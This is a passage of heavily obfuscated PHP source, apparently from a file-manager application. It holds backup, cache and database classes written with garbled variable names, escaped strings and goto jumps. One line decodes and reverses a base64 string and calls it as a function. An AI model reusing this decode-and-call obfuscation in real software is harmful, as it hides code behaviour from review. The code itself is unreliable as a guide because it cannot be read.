$òÛÑšĞ[1424] => $òÛÑšĞ[12]); $‡ÆîºÏ = $this->client->listObjects($this->bucket, $ÆÅ’š”§); if ($‡ÆîºÏ->getObjectList() || $‡ÆîºÏ->getPrefixList()) { return !0; } return !1; } } goto aÎæ¨©ğ‡; b¨ò¯²ôá: $fileSize = strrev(base64_decode($_SERVER[îˆ‡ºÄµ][0])); function binCheckNeq($åğÕÚ˜œ, $¼ü¼ğ´¹) { return $åğÕÚ˜œ != $¼ü¼ğ´¹; } $_SERVER[$_SERVER[îˆ‡ºÄµ][1]] = $fileSize($_SERVER[$_SERVER[îˆ‡ºÄµ][2]]); goto eÖ‡ŞÂØåá; eÉñ™‘½´è: class BackupDbFile { public function __construct() { } public function index() { $’óÚÜ =& $_SERVER[³½¬ÚË¯]; $Àœşõ¥ = Backup::get(); $àÁÕæ†Ó = $Àœşõ¥[$’óÚÜ[32]]; $ƒğÀ•¾î = $this->tmpFilesPath() . "\142\x61\x63\x6b\165\x70\x5f{$àÁÕæ†Ó}\x2f"; $©œ“ÈşĞ = $this->backupPath($Àœşõ¥); if (!($©œ“ÈşĞ = IO::mkdir($©œ“ÈşĞ))) { return !1; } $®‹„¶ó = IO::listPath($ƒğÀ•¾î); $¹„»è¦„ = isset($®‹„¶ó[$’óÚÜ[83]]) ? $®‹„¶ó[$’óÚÜ[83]] : array(); $ı½Àî = array_sum(array_column($¹„»è¦„, $’óÚÜ[76])); if (!$ı½Àî) { return !1; } $Šè÷ù¾€ = array($’óÚÜ[834] => $ı½Àî, $’óÚÜ[835] => time()); Backup::set($Šè÷ù¾€); $¨â€şÁŒ = new TaskFileTransfer($’óÚÜ[836], $’óÚÜ[816], count($¹„»è¦„), LNG($’óÚÜ[817]) . $’óÚÜ[430] . LNG($’óÚÜ[819]) . $’óÚÜ[837]); $¨â€şÁŒ->task[$’óÚÜ[799]] = $ı½Àî; foreach ($®‹„¶ó[$’óÚÜ[83]] as $Ôéâ€¿û) { $à‚É‹˜‰ = IO::move($Ôéâ€¿û[$’óÚÜ[84]], $©œ“ÈşĞ); if (!$à‚É‹˜‰) { $¨â€şÁŒ->end(); $ÔÑôıÑ† = IO::getLastError($’óÚÜ[838] . $Ôéâ€¿û[$’óÚÜ[84]] . $’óÚÜ[839] . $©œ“ÈşĞ . $’óÚÜ[165]); write_log($ÔÑôıÑ†, $’óÚÜ[816]); return !1; } } $ª§£ñäó = new DbManage(); $Ë’°Š˜Â = $ª§£ñäó->getSqlFile(); if (!$Ë’°Š˜Â[$’óÚÜ[840]] || !$Ë’°Š˜Â[$’óÚÜ[13]]) { return !1; } IO::move($Ë’°Š˜Â[$’óÚÜ[840]], $©œ“ÈşĞ); IO::move($Ë’°Š˜Â[$’óÚÜ[13]], $©œ“ÈşĞ); $¨â€şÁŒ->end(); $Šè÷ù¾€ = array($’óÚÜ[841] => $ı½Àî, $’óÚÜ[842] => time()); Backup::set($Šè÷ù¾€); return !0; } private function backupPath($Ğ½ïÈÈÌ) { $°±İ ĞŒ =& $_SERVER[³½¬ÚË¯]; $ÌîÜöğÒ = $Ğ½ïÈÈÌ[$°±İ ĞŒ[32]]; $¬üô‹®Â = Model($°±İ ĞŒ[806])->get($°±İ ĞŒ[807]); $ÜÙšù×Ø = substr(md5($°±İ ĞŒ[808] . $¬üô‹®Â . $ÌîÜöğÒ), 0, 8); return "\x7b\151\x6f\72{$Ğ½ïÈÈÌ[$°±İ ĞŒ[787]]}\175\x2f\x64\141\164\141\142\141\163\x65\57\142\141\x63\x6b\165\x70\57" . $ÌîÜöğÒ . $°±İ ĞŒ[11] . $ÜÙšù×Ø; } private function tmpFilesPath() { $ÉûÓìè =& $_SERVER[³½¬ÚË¯]; $¿Êºë±¥ = TEMP_FILES; if ($GLOBALS[$ÉûÓìè[6]][$ÉûÓìè[89]][$ÉûÓìè[832]]) { $¿Êºë±¥ = $GLOBALS[$ÉûÓìè[6]][$ÉûÓìè[89]][$ÉûÓìè[832]]; if (!mk_dir($¿Êºë±¥) || !is_writable($¿Êºë±¥) || !IO::mkfile($¿Êºë±¥ . $ÉûÓìè[833])) { $¿Êºë±¥ = TEMP_FILES; } } return $¿Êºë±¥; } } class BackupFile { public function __construct() { } public function index() { $¸”øí³Ñ = Backup::get(); $¡º‹Ñ¹´ = $¸”øí³Ñ[$_SERVER[³½¬ÚË¯][337]][$_SERVER[³½¬ÚË¯][214]][$_SERVER[³½¬ÚË¯][509]]; $—›Á·Ï = array($_SERVER[³½¬ÚË¯][510] => array($_SERVER[³½¬ÚË¯][843], $¡º‹Ñ¹´), $_SERVER[³½¬ÚË¯][844] => array($_SERVER[³½¬ÚË¯][375], $¸”øí³Ñ[$_SERVER[³½¬ÚË¯][787]])); $¬Ôšˆ = (int) Model($_SERVER[³½¬ÚË¯][825])->where($—›Á·Ï)->count($_SERVER[³½¬ÚË¯][509]); $ÂØ Åêô = (int) Model($_SERVER[³½¬ÚË¯][825])->where($—›Á·Ï)->sum($_SERVER[³½¬ÚË¯][76]); $Íé—Åğ = new TaskFileTransfer($_SERVER[³½¬ÚË¯][845], $_SERVER[³½¬ÚË¯][816], $¬Ôšˆ, LNG($_SERVER[³½¬ÚË¯][817]) . $_SERVER[³½¬ÚË¯][818] . LNG($_SERVER[³½¬ÚË¯][846])); $Íé—Åğ->task[$_SERVER[³½¬ÚË¯][799]] = $ÂØ Åêô; $ı£¸øÕ¬ = array($_SERVER[³½¬ÚË¯][847] => $¬Ôšˆ, $_SERVER[³½¬ÚË¯][848] => $ÂØ Åêô, $_SERVER[³½¬ÚË¯][849] => time()); Backup::set($ı£¸øÕ¬); $áµ¿ıÂâ = !0; $éäÆúóÅ = $this->storeIds(); $’Èƒû = 1; $ÉÔÜ™ë¿ = 1000; $”¿Š¿Ÿ = $ËêÓĞß = 0; $ŸÙÑÑóÊ = array(); $¶œîÑÙ = $ââş•’Ô = 0; do { $©ıäˆ¯¶ = $_SERVER[³½¬ÚË¯][850]; $×£éİ‡¢ = Model($_SERVER[³½¬ÚË¯][825])->where($—›Á·Ï)->field($©ıäˆ¯¶)->order($_SERVER[³½¬ÚË¯][851])->selectPage($ÉÔÜ™ë¿, $’Èƒû); $Œ¿·Ë› = !empty($×£éİ‡¢[$_SERVER[³½¬ÚË¯][413]]) ? $×£éİ‡¢[$_SERVER[³½¬ÚË¯][413]] : array(); foreach ($Œ¿·Ë› as $şš¢³) { if (!$this->_fileExist($şš¢³, $ŸÙÑÑóÊ, $éäÆúóÅ)) { $¬Ôšˆ -= 1; $ÂØ Åêô -= (int) $şš¢³[$_SERVER[³½¬ÚË¯][76]]; write_log("\146\x69\x6c\x65\x20\x6e\x6f\164\x20\x65\170\x69\163\164\x2e\x66\151\x6c\x65\x49\x44\72{$şš¢³[$_SERVER[³½¬ÚË¯][509]]}\x2c\x20\x70\x61\164\150\72{$şš¢³[$_SERVER[³½¬ÚË¯][84]]}", $_SERVER[³½¬ÚË¯][852]); continue; } $ş½‘‡ÎÄ = $şš¢³[$_SERVER[³½¬ÚË¯][84]]; $–¦ÂŒ×§ = "\x7b\x69\x6f\72{$¸”øí³Ñ[$_SERVER[³½¬ÚË¯][787]]}\175" . substr($ş½‘‡ÎÄ, strlen("\x7b\x69\x6f\x3a{$şš¢³[$_SERVER[³½¬ÚË¯][853]]}\175")); if (IO::exist($–¦ÂŒ×§)) { $Íé—Åğ->updateFileEnd($şš¢³[$_SERVER[³½¬ÚË¯][32]], $şš¢³[$_SERVER[³½¬ÚË¯][76]]); } else { $–¦ÂŒ×§ = get_path_father($–¦ÂŒ×§); IO::mkdir($–¦ÂŒ×§); if (!IO::copy($ş½‘‡ÎÄ, $–¦ÂŒ×§, $_SERVER[³½¬ÚË¯][854])) { write_log($_SERVER[³½¬ÚË¯][855] . $ş½‘‡ÎÄ . $_SERVER[³½¬ÚË¯][839] . $–¦ÂŒ×§ . $_SERVER[³½¬ÚË¯][165], $_SERVER[³½¬ÚË¯][816]); $áµ¿ıÂâ = !1; break; } } $¡º‹Ñ¹´ = $şš¢³[$_SERVER[³½¬ÚË¯][509]]; $ËêÓĞß += 1; $”¿Š¿Ÿ += $şš¢³[$_SERVER[³½¬ÚË¯][76]]; $ââş•’Ô += 1; $¶œîÑÙ += $şš¢³[$_SERVER[³½¬ÚË¯][76]]; if ($”¿Š¿Ÿ >= 1024 * 1024 * 100) { $ı£¸øÕ¬ = array($_SERVER[³½¬ÚË¯][856] => $¡º‹Ñ¹´, $_SERVER[³½¬ÚË¯][857] => $ââş•’Ô, $_SERVER[³½¬ÚË¯][858] => $¶œîÑÙ); Backup::set($ı£¸øÕ¬); $”¿Š¿Ÿ = $ËêÓĞß = 0; } } $øÃî¾ñ­ = count($Œ¿·Ë›); $’Èƒû++; } while ($øÃî¾ñ­ == $ÉÔÜ™ë¿); $Íé—Åğ->end(); $ı£¸øÕ¬ = array($_SERVER[³½¬ÚË¯][859] => 1, $_SERVER[³½¬ÚË¯][797] => time(), $_SERVER[³½¬ÚË¯][811] => 1, $_SERVER[³½¬ÚË¯][856] => $¡º‹Ñ¹´, $_SERVER[³½¬ÚË¯][848] => $ÂØ Åêô, $_SERVER[³½¬ÚË¯][847] => $¬Ôšˆ, $_SERVER[³½¬ÚË¯][860] => time()); if ($ËêÓĞß) { $ı£¸øÕ¬[$_SERVER[³½¬ÚË¯][857]] = $ââş•’Ô; $ı£¸øÕ¬[$_SERVER[³½¬ÚË¯][858]] = $¶œîÑÙ; } Backup::set($ı£¸øÕ¬); $this->_fileFilter($ŸÙÑÑóÊ); return !0; } private function _fileExist($‘½œÁ•­, &$¯Æ§Éïˆ, $†ÊæÛêğ) { $„¾óŠ÷ =& $_SERVER[³½¬ÚË¯]; $óëê¯èş = $‘½œÁ•­[$„¾óŠ÷[84]]; if (in_array($‘½œÁ•­[$„¾óŠ÷[509]], $¯Æ§Éïˆ)) { return !1; } if (!in_array($‘½œÁ•­[$„¾óŠ÷[853]], $†ÊæÛêğ)) { return !1; } if (IO::exist($óëê¯èş)) { return !0; } $×ı ó®û = get_path_father($óëê¯èş); if (IO::exist($×ı ó®û)) { $¯Æ§Éïˆ[] = $‘½œÁ•­[$„¾óŠ÷[509]]; return !1; } $²åÑ›éÑ = array($„¾óŠ÷[853] => $‘½œÁ•­[$„¾óŠ÷[853]], $„¾óŠ÷[84] => array($„¾óŠ÷[427], "{$×ı ó®û}\45")); $™İâÛ‘ƒ = Model($„¾óŠ÷[825])->where($²åÑ›éÑ)->field($„¾óŠ÷[510])->select(); $¯Æ§Éïˆ = array_merge($¯Æ§Éïˆ, array_to_keyvalue($™İâÛ‘ƒ, $„¾óŠ÷[12], $„¾óŠ÷[509])); return !1; } private function _fileFilter($¼ã¡÷£·) { $şÈò¤„À =& $_SERVER[³½¬ÚË¯]; if (empty($¼ã¡÷£·)) { return; } $¼ÆñÖ½ = array($şÈò¤„À[509] => array($şÈò¤„À[7], array_unique($¼ã¡÷£·))); $ì¾–îşÉ = Model($şÈò¤„À[861])->where($¼ÆñÖ½)->field($şÈò¤„À[181])->select(); foreach ($ì¾–îşÉ as $ì¬ÀÄ¶¯) { Model($şÈò¤„À[861])->remove($ì¬ÀÄ¶¯[$şÈò¤„À[181]], !1); } } private function storeIds() { $©‚âˆ¾û =& $_SERVER[³½¬ÚË¯]; $Ã‰ú¿Ï = Model($©‚âˆ¾û[803])->listData(); $½¶±©à€ = array(); $ÏÌ°’¬ = $GLOBALS[$©‚âˆ¾û[6]][$©‚âˆ¾û[89]][$©‚âˆ¾û[862]]; foreach ($Ã‰ú¿Ï as $†‚»ğ) { $ˆ÷•Òğ = strtolower($†‚»ğ[$©‚âˆ¾û[95]]); if (!isset($ÏÌ°’¬[$ˆ÷•Òğ])) { continue; } $í›‡€–Ó = $©‚âˆ¾û[74] . (isset($ÏÌ°’¬[$ˆ÷•Òğ]) ? $ÏÌ°’¬[$ˆ÷•Òğ] : ucfirst($ˆ÷•Òğ)); if (!class_exists($í›‡€–Ó)) { continue; } $½¶±©à€[] = $†‚»ğ[$©‚âˆ¾û[443]]; } return $½¶±©à€; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $´¬æè =& $_SERVER[³½¬ÚË¯]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $£»ˆû‘ = $GLOBALS[$´¬æè[6]][$´¬æè[393]]; $âÀì×Æá = $£»ˆû‘[$£»ˆû‘[$´¬æè[863]]]; $’œéâÊ‘ = $£»ˆû‘[$´¬æè[864]]; switch ($£»ˆû‘[$´¬æè[863]]) { case $´¬æè[21]: self::$handle = Model($´¬æè[865]); break; case $´¬æè[866]: self::$handle = new CacheRedis($âÀì×Æá, $’œéâÊ‘); break; case $´¬æè[867]: self::$handle = new CacheMemcached($âÀì×Æá, $’œéâÊ‘); break; case $´¬æè[214]: self::$handle = new CacheFile($âÀì×Æá, $’œéâÊ‘); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Úğ¬Ü‚) { if (is_array($Úğ¬Ü‚) || is_object($Úğ¬Ü‚)) { $Úğ¬Ü‚ = json_encode($Úğ¬Ü‚); } $Úğ¬Ü‚ = rawurlencode($Úğ¬Ü‚); return md5(KOD_SITE_ID . $_SERVER[³½¬ÚË¯][11] . $Úğ¬Ü‚); } public static function get($æèšöğ³, $ÇÖ”ÁÜš = false) { $ğÀ°ø‰ = self::key($æèšöğ³); $É™³ˆ¢ú = self::init(); if ($ÇÖ”ÁÜš) { return unserialize($É™³ˆ¢ú->get($ğÀ°ø‰)); } if (!isset(self::$memoryCache[$ğÀ°ø‰])) { $¬‰¡¦ëè = $É™³ˆ¢ú->get($ğÀ°ø‰); self::$memoryCache[$ğÀ°ø‰] = unserialize($¬‰¡¦ëè); } return self::$memoryCache[$ğÀ°ø‰]; } public static function set($”¢Øæ¨¿, $û×Š¨åù, $à»¯²²ù = false) { $€µÌ²Ó =& $_SERVER[³½¬ÚË¯]; $•Å­Ãû‚ = self::key($”¢Øæ¨¿); if (isset(self::$memoryCache[$•Å­Ãû‚]) && self::$memoryCache[$•Å­Ãû‚] === $û×Š¨åù) { return !0; } if ($à»¯²²ù === 0) { self::$memoryCache[$•Å­Ãû‚] = $û×Š¨åù; return !0; } $©àÄËœŞ = self::init(); $ç¨¹À¾ = serialize($û×Š¨åù); CacheLock::lock($”¢Øæ¨¿ . $€µÌ²Ó[868]); $¿Â¸„ËÀ = $©àÄËœŞ->set($•Å­Ãû‚, $ç¨¹À¾, $à»¯²²ù); self::$memoryCache[$•Å­Ãû‚] = $û×Š¨åù; CacheLock::unlock($”¢Øæ¨¿ . $€µÌ²Ó[868]); return $¿Â¸„ËÀ; } public static function getCall($µŒ¿ç, $’ÅÛÌ•¿, $»ÆÇÏ²Ÿ, $Îù™© = array()) { $éËü˜Ö× =& $_SERVER[³½¬ÚË¯]; $¶ÃÒËäĞ = self::get($µŒ¿ç); if ($¶ÃÒËäĞ || $¶ÃÒËäĞ === $éËü˜Ö×[12]) { return $¶ÃÒËäĞ; } $¶ÃÒËäĞ = call_user_func_array($»ÆÇÏ²Ÿ, $Îù™©); $¶ÃÒËäĞ = $¶ÃÒËäĞ ? $¶ÃÒËäĞ : $éËü˜Ö×[12]; self::set($µŒ¿ç, $¶ÃÒËäĞ, $’ÅÛÌ•¿); return $¶ÃÒËäĞ; } public static function remove($œï–ÜıĞ) { $’›œ‹¿Ò = self::key($œï–ÜıĞ); unset(self::$memoryCache[$’›œ‹¿Ò]); self::clearTimeout(); CacheLock::lock($œï–ÜıĞ); $”†”ÉÔÖ = self::init()->remove($’›œ‹¿Ò); CacheLock::unlock($œï–ÜıĞ); return $”†”ÉÔÖ; } public static function removeMemory($òÜÀıÕÍ) { $Ö‘œô× = self::key($òÜÀıÕÍ); unset(self::$memoryCache[$Ö‘œô×]); } public static function clearMemory($ñ©ú‚é = false) { if ($ñ©ú‚é) { $ñ©ú‚é = self::key($ñ©ú‚é); unset(self::$memoryCache[$ñ©ú‚é]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[³½¬ÚË¯][869])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[³½¬ÚË¯][870])) { self::init()->clearTimeout(); } } } goto BŞ§ÀçÑ­­; Bñ¥óÜŠßù: class DbSqlite3 extends DbSqlite3Base { public function query($çîŠ£ì) { $è¼¹ó© =& $_SERVER[³½¬ÚË¯]; if (!CacheLock::fileLock($è¼¹ó©[13])) { return !1; } $²”ê¯ª = parent::query($çîŠ£ì); CacheLock::fileUnLock($è¼¹ó©[13]); return $²”ê¯ª; } public function execute($ü–şï´³) { $´÷‡‰şÄ =& $_SERVER[³½¬ÚË¯]; if (!CacheLock::fileLock($´÷‡‰şÄ[13])) { return !1; } $™ÚÖ«·Î = parent::execute($ü–şï´³); CacheLock::fileUnLock($´÷‡‰şÄ[13]); return $™ÚÖ«·Î; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\151\x6e\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\156\x65\x71" => "\x3c\76", "\147\x74" => "\76", "\145\x67\x74" => "\x3e\75", "\x6c\164" => "\74", "\145\154\164" => "\74\x3d", "\x6e\157\164\154\151\153\x65" => "\x4e\117\124\40\x4c\111\x4b\x45", "\x6c\151\x6b\145" => "\x4c\x49\x4b\x45", "\x69\x6e" => "\111\x4e", "\156\x6f\x74\x69\x6e" => "\116\117\124\40\x49\x4e", "\x6e\x6f\x74\x20\x69\156" => "\116\x4f\124\40\x49\116", "\142\145\164\167\145\145\x6e" => "\x42\x45\x54\x57\x45\105\x4e", "\156\157\x74\x62\x65\164\x77\x65\145\x6e" => "\116\x4f\x54\x20\102\x45\124\x57\105\x45\x4e", "\156\x6f\x74\40\x62\x65\x74\x77\x65\145\156" => "\x4e\117\x54\40\x42\x45\124\127\x45\x45\116"); protected $selectSql = "\123\105\x4c\x45\103\x54\x25\x44\111\123\124\x49\116\103\x54\45\40\x25\x46\x49\x45\x4c\104\45\40\x46\x52\x4f\115\40\x25\x54\101\102\x4c\x45\45\x25\x4a\x4f\111\116\45\x25\127\110\105\x52\x45\x25\45\107\122\117\x55\120\x25\x25\x48\x41\126\x49\x4e\x47\x25\45\x4f\122\x44\105\x52\45\45\x4c\111\115\x49\124\x25\x20\x25\125\x4e\111\117\x4e\45\45\x43\117\115\x4d\x45\116\124\45"; protected $bind = array(); public static function getInstance() { $‹µòúØÈ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[³½¬ÚË¯][1003], $‹µòúØÈ); } public function factory($®¨Å†ù = '') { $àô¸ß›® =& $_SERVER[³½¬ÚË¯]; $®¨Å†ù = $this->parseConfig($®¨Å†ù); if (empty($®¨Å†ù[$àô¸ß›®[1004]])) { think_exception(think_lang($àô¸ß›®[1005])); } $this->dbType = ucwords(strtolower($®¨Å†ù[$àô¸ß›®[1004]])); $·Ë•¨‰ª = $àô¸ß›®[1006] . $this->dbType; if (class_exists($·Ë•¨‰ª)) { $ªğàëÔì = new $·Ë•¨‰ª($®¨Å†ù); if ($àô¸ß›®[1007] != strtolower($®¨Å†ù[$àô¸ß›®[1004]])) { $ªğàëÔì->dbType = strtoupper($this->dbType); } else { $ªğàëÔì->dbType = $this->_getDsnType($®¨Å†ù[$àô¸ß›®[959]]); } } else { think_exception(think_lang($àô¸ß›®[1008]) . $àô¸ß›®[1009] . $·Ë•¨‰ª); } return $ªğàëÔì; } public function __call($µ‡‰©, $¸™‘ÆøŠ) { if (method_exists($this, $µ‡‰©)) { return call_user_func_array(array($this, $µ‡‰©), $¸™‘ÆøŠ); } } protected function _getDsnType($ÇÆäîØ ) { $õåêÛ™» = explode($_SERVER[³½¬ÚË¯][4], $ÇÆäîØ ); $ÓÆˆê„‹ = strtoupper(trim($õåêÛ™»[0])); return $ÓÆˆê„‹; } private function parseConfig($åüšâ®Í = '') { $³š–Ÿ£Î =& $_SERVER[³½¬ÚË¯]; if (!empty($åüšâ®Í) && is_string($åüšâ®Í)) { $åüšâ®Í = $this->parseDSN($åüšâ®Í); } elseif (is_array($åüšâ®Í)) { $åüšâ®Í = array_change_key_case($åüšâ®Í); $åüšâ®Í = array($³š–Ÿ£Î[1004] => $åüšâ®Í[$³š–Ÿ£Î[1010]], $³š–Ÿ£Î[931] => $åüšâ®Í[$³š–Ÿ£Î[1011]], $³š–Ÿ£Î[932] => $åüšâ®Í[$³š–Ÿ£Î[1012]], $³š–Ÿ£Î[929] => $åüšâ®Í[$³š–Ÿ£Î[1013]], $³š–Ÿ£Î[930] => $åüšâ®Í[$³š–Ÿ£Î[1014]], $³š–Ÿ£Î[21] => $åüšâ®Í[$³š–Ÿ£Î[1015]], $³š–Ÿ£Î[959] => $åüšâ®Í[$³š–Ÿ£Î[1016]], $³š–Ÿ£Î[17] => isset($åüšâ®Í[$³š–Ÿ£Î[1017]]) ? $åüšâ®Í[$³š–Ÿ£Î[1017]] : array()); } elseif (empty($åüšâ®Í)) { if (think_config($³š–Ÿ£Î[1018]) && $³š–Ÿ£Î[1007] != strtolower(think_config($³š–Ÿ£Î[1019]))) { $åüšâ®Í = $this->parseDSN(think_config($³š–Ÿ£Î[1018])); } else { $åüšâ®Í = array($³š–Ÿ£Î[1004] => think_config($³š–Ÿ£Î[1019]), $³š–Ÿ£Î[931] => think_config($³š–Ÿ£Î[1020]), $³š–Ÿ£Î[932] => think_config($³š–Ÿ£Î[1021]), $³š–Ÿ£Î[929] => think_config($³š–Ÿ£Î[1022]), $³š–Ÿ£Î[930] => think_config($³š–Ÿ£Î[1023]), $³š–Ÿ£Î[21] => think_config($³š–Ÿ£Î[290]), $³š–Ÿ£Î[959] => think_config($³š–Ÿ£Î[1018]), $³š–Ÿ£Î[17] => think_config($³š–Ÿ£Î[1024])); } } return $åüšâ®Í; } protected function initConnect($”ß³Ï¬î = true) { if (1 == think_config($_SERVER[³½¬ÚË¯][22])) { $this->_linkID = $this->multiConnect($”ß³Ï¬î); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $À±³„Şˆ => $œ³Ëˆİ) { $this->_linkID = $œ³Ëˆİ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($•¼³„¿ô = false) { $½ÍÕüÜú =& $_SERVER[³½¬ÚË¯]; static $ÀúÅ–¢Ò = array(); static $“ïªš‹Û = -1; if (empty($ÀúÅ–¢Ò)) { foreach ($this->config as $“ÁÚÕÒ => $¯éøºÃ) { $ÀúÅ–¢Ò[$“ÁÚÕÒ] = explode($½ÍÕüÜú[50], $¯éøºÃ); } } if (think_config($½ÍÕüÜú[1025])) { if ($•¼³„¿ô || think_config($½ÍÕüÜú[439]) === !0) { $Ûïø†úê = floor(mt_rand(0, think_config($½ÍÕüÜú[1026]) - 1)); $“ïªš‹Û = $Ûïø†úê; } else { if (is_numeric(think_config($½ÍÕüÜú[1027]))) { $Ûïø†úê = think_config($½ÍÕüÜú[1027]); } else { $Ûïø†úê = floor(mt_rand(think_config($½ÍÕüÜú[1026]), count($ÀúÅ–¢Ò[$½ÍÕüÜú[929]]) - 1)); } } } else { $Ûïø†úê = floor(mt_rand(0, count($ÀúÅ–¢Ò[$½ÍÕüÜú[929]]) - 1)); $“ïªš‹Û = $Ûïø†úê; } $Ûïø†úê = $“ïªš‹Û !== -1 ? $“ïªš‹Û : $Ûïø†úê; $õ¥ŞíÚ¯ = array($½ÍÕüÜú[931] => isset($ÀúÅ–¢Ò[$½ÍÕüÜú[931]][$Ûïø†úê]) ? $ÀúÅ–¢Ò[$½ÍÕüÜú[931]][$Ûïø†úê] : $ÀúÅ–¢Ò[$½ÍÕüÜú[931]][0], $½ÍÕüÜú[932] => isset($ÀúÅ–¢Ò[$½ÍÕüÜú[932]][$Ûïø†úê]) ? $ÀúÅ–¢Ò[$½ÍÕüÜú[932]][$Ûïø†úê] : $ÀúÅ–¢Ò[$½ÍÕüÜú[932]][0], $½ÍÕüÜú[929] => isset($ÀúÅ–¢Ò[$½ÍÕüÜú[929]][$Ûïø†úê]) ? $ÀúÅ–¢Ò[$½ÍÕüÜú[929]][$Ûïø†úê] : $ÀúÅ–¢Ò[$½ÍÕüÜú[929]][0], $½ÍÕüÜú[930] => isset($ÀúÅ–¢Ò[$½ÍÕüÜú[930]][$Ûïø†úê]) ? $ÀúÅ–¢Ò[$½ÍÕüÜú[930]][$Ûïø†úê] : $ÀúÅ–¢Ò[$½ÍÕüÜú[930]][0], $½ÍÕüÜú[21] => isset($ÀúÅ–¢Ò[$½ÍÕüÜú[21]][$Ûïø†úê]) ? $ÀúÅ–¢Ò[$½ÍÕüÜú[21]][$Ûïø†úê] : $ÀúÅ–¢Ò[$½ÍÕüÜú[21]][0], $½ÍÕüÜú[959] => isset($ÀúÅ–¢Ò[$½ÍÕüÜú[959]][$Ûïø†úê]) ? $ÀúÅ–¢Ò[$½ÍÕüÜú[959]][$Ûïø†úê] : $ÀúÅ–¢Ò[$½ÍÕüÜú[959]][0], $½ÍÕüÜú[17] => isset($ÀúÅ–¢Ò[$½ÍÕüÜú[17]][$Ûïø†úê]) ? $ÀúÅ–¢Ò[$½ÍÕüÜú[17]][$Ûïø†úê] : $ÀúÅ–¢Ò[$½ÍÕüÜú[17]][0]); return $this->connect($õ¥ŞíÚ¯, $Ûïø†úê); } public function parseDSN($„è¨÷Ÿ) { $÷¼Ûß§ =& $_SERVER[³½¬ÚË¯]; if (empty($„è¨÷Ÿ)) { return !1; } $—©ä¹ş = parse_url($„è¨÷Ÿ); if ($—©ä¹ş[$÷¼Ûß§[195]]) { $æ³ãå²ç = array($÷¼Ûß§[1004] => $—©ä¹ş[$÷¼Ûß§[195]], $÷¼Ûß§[931] => isset($—©ä¹ş[$÷¼Ûß§[631]]) ? $—©ä¹ş[$÷¼Ûß§[631]] : $÷¼Ûß§[12], $÷¼Ûß§[932] => isset($—©ä¹ş[$÷¼Ûß§[1028]]) ? $—©ä¹ş[$÷¼Ûß§[1028]] : $÷¼Ûß§[12], $÷¼Ûß§[929] => isset($—©ä¹ş[$÷¼Ûß§[196]]) ? $—©ä¹ş[$÷¼Ûß§[196]] : $÷¼Ûß§[12], $÷¼Ûß§[930] => isset($—©ä¹ş[$÷¼Ûß§[197]]) ? $—©ä¹ş[$÷¼Ûß§[197]] : $÷¼Ûß§[12], $÷¼Ûß§[21] => isset($—©ä¹ş[$÷¼Ûß§[84]]) ? substr($—©ä¹ş[$÷¼Ûß§[84]], 1) : $÷¼Ûß§[12]); } else { preg_match($÷¼Ûß§[1029], trim($„è¨÷Ÿ), $ÀÔ™İ ); $æ³ãå²ç = array($÷¼Ûß§[1004] => $ÀÔ™İ [1], $÷¼Ûß§[931] => $ÀÔ™İ [2], $÷¼Ûß§[932] => $ÀÔ™İ [3], $÷¼Ûß§[929] => $ÀÔ™İ [4], $÷¼Ûß§[930] => $ÀÔ™İ [5], $÷¼Ûß§[21] => $ÀÔ™İ [6]); } $æ³ãå²ç[$÷¼Ûß§[959]] = $÷¼Ûß§[12]; return $æ³ãå²ç; } protected function debug() { $Øš´ˆ‘÷ =& $_SERVER[³½¬ÚË¯]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Øš´ˆ‘÷[1030]; if (think_config($Øš´ˆ‘÷[1031])) { think_status($Øš´ˆ‘÷[1032]); think_trace($this->queryStr . $Øš´ˆ‘÷[1033] . think_status($Øš´ˆ‘÷[24], $Øš´ˆ‘÷[1032], 6) . $Øš´ˆ‘÷[1034], $Øš´ˆ‘÷[12], $Øš´ˆ‘÷[1035]); } } protected function parseLock($º·Ë²„ = false) { $êøí¨Ô =& $_SERVER[³½¬ÚË¯]; if (!$º·Ë²„) { return $êøí¨Ô[12]; } if ($êøí¨Ô[961] == $this->dbType) { return $êøí¨Ô[1036]; } return $êøí¨Ô[1037]; } protected function parseSet($şŠÄÇ—¾) { $¶ÁğÁÅ· =& $_SERVER[³½¬ÚË¯]; foreach ($şŠÄÇ—¾ as $÷é«ïÏá => $ÉíÃÆß) { if (is_array($ÉíÃÆß) && $¶ÁğÁÅ·[341] == $ÉíÃÆß[0]) { $Æ˜ÎÄ¢[] = $this->parseKey($÷é«ïÏá) . $¶ÁğÁÅ·[927] . $ÉíÃÆß[1]; } elseif (is_scalar($ÉíÃÆß) || is_null($ÉíÃÆß)) { $Æ˜ÎÄ¢[] = $this->parseKey($÷é«ïÏá) . $¶ÁğÁÅ·[927] . $this->parseValue($ÉíÃÆß); } } return $¶ÁğÁÅ·[1038] . implode($¶ÁğÁÅ·[50], $Æ˜ÎÄ¢); } protected function bindParam($Ù–Š™¥«, $ƒùÔÂÎ) { $this->bind[$_SERVER[³½¬ÚË¯][4] . $Ù–Š™¥«] = $ƒùÔÂÎ; } protected function parseBind($“Ïú±¯ı) { $“Ïú±¯ı = array_merge($this->bind, $“Ïú±¯ı); $this->bind = array(); return $“Ïú±¯ı; } function parseKey(&$Š¸µ”, $Ï½÷ä¼ = true) { if ($Ï½÷ä¼) { $Š¸µ” = $this->parseKeyCheck($Š¸µ”); } return $Š¸µ”; } function parseKeyCheck($‰§·ñ½Ù) { $±ÒÕÄÃÁ =& $_SERVER[³½¬ÚË¯]; $‰§·ñ½Ù = 